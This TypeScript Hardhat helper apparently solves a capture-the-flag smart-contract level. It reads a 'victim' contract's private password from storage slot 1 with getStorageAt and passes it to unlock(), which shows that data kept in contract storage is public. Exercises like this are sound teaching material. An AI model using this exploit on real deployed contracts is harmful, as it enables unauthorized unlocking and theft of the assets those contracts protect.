import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  var bytesPwd = await victim.provider.getStorageAt(victim.address, 1);
  // var pwd = ethers.utils.parseBytes32String(bytesPwd);
  // console.log(`---> password: ${(pwd)}`);

  await victim.unlock(bytesPwd);
};

export default helper;
